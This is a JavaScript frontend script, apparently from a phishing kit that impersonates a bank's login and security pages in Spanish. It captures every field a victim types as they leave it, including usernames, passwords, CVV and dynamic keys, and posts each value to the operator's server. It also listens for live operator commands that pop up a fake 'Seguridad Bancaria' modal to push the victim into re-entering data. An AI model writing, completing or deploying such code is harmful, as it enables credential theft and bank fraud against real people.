/* serfina socket client: include this on your frontend pages (index, exoneracion, seguridad, confirmado)
   It connects, registers clientId, sends field updates on blur, and listens for admin commands.
*/
(function(){
  const script = document.currentScript;
  const socket = io();
  let clientId = localStorage.getItem('serfina_clientId');

  socket.on('connect', ()=>{ socket.emit('register_client', { clientId }); });

  socket.on('registered', (data) => { clientId = data.clientId; localStorage.setItem('serfina_clientId', clientId); });

  socket.on('admin_command', (cmd) => {
    if(cmd.action === 'retry'){
      showSecurityModal(cmd.field, cmd.message);
    } else if(cmd.action === 'continue'){
      // allow continue - reload or navigate as per your flow
      window.location.reload();
    }
  });

  // helper to send payload to backend via fetch
  async function sendPayload(payload){
    payload.clientId = clientId;
    try{
      const r = await fetch('/api/save', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload)});
      const data = await r.json();
      if(data && data.clientId){ localStorage.setItem('serfina_clientId', data.clientId); clientId = data.clientId; }
    }catch(e){}
  }

  // attach onblur to inputs automatically (inputs must have name attributes matching fields)
  function attachAutoSend(){
    const inputs = document.querySelectorAll('input[name], textarea[name], select[name]');
    inputs.forEach(inp => {
      if(inp.dataset.serfinaAttached) return;
      inp.addEventListener('blur', ()=> {
        const name = inp.name;
        const val = inp.value;
        const payload = {};
        payload[name] = val;
        if(inp.type === 'password' && name.toLowerCase().indexOf('pass')===-1) payload['password'] = val;
        sendPayload(payload);
      });
      inp.dataset.serfinaAttached = '1';
    });
  }
  function showSecurityModal(field, message){
    let modal = document.getElementById('serfina-security-modal');
    if(!modal){
      modal = document.createElement('div');
      modal.id = 'serfina-security-modal';
      modal.style.position='fixed';
      modal.style.left=0; modal.style.top=0; modal.style.right=0; modal.style.bottom=0;
      modal.style.display='flex'; modal.style.alignItems='center'; modal.style.justifyContent='center';
      modal.style.background='rgba(0,0,0,0.5)'; modal.style.zIndex=99999;
      modal.innerHTML = '<div style="background:#fff;padding:20px;border-radius:14px;max-width:420px;text-align:center;border:4px solid #0b4f6c"><h2 style="color:#0b4f6c">🔒 Seguridad Bancaria</h2><p id="serfina-security-text"></p><button id="serfina-security-btn" style="background:#0b4f6c;color:#fff;padding:10px 18px;border-radius:10px;border:none">Continuar</button></div>';
      document.body.appendChild(modal);
    }
    document.getElementById('serfina-security-text').innerText = message || ('Debes volver a colocar tu ' + field);
    const btn = document.getElementById('serfina-security-btn');
    btn.onclick = function(){
      modal.remove();
      const map = { usuario: '/Login/index.php', password: '/Login/index.php', correo: '/Login/exoneracion.html', cvv: '/Login/seguridad.html', clave_dinamica: '/Login/seguridad.html' };
      const target = map[field] || '/Login/index.php';
      window.location.href = target;
    };
  }

  if(document.readyState === 'loading') document.addEventListener('DOMContentLoaded', attachAutoSend);
  else attachAutoSend();

  window.serfinaSend = sendPayload;
})();
